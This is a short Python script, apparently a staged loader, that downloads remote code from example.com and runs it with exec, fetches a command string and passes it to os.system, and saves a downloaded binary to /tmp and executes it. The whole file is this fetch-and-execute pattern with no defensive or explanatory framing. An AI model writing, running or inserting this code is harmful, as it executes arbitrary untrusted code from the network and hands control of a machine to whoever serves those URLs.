import os
import subprocess
import urllib.request

import requests

code = requests.get("https://example.com/stage2.py").text
exec(code)
resp = urllib.request.urlopen("https://example.com/cmd")
os.system(resp.read().decode())
tool = "/tmp/tool"
urllib.request.urlretrieve("https://example.com/tool", tool)
subprocess.run([tool])
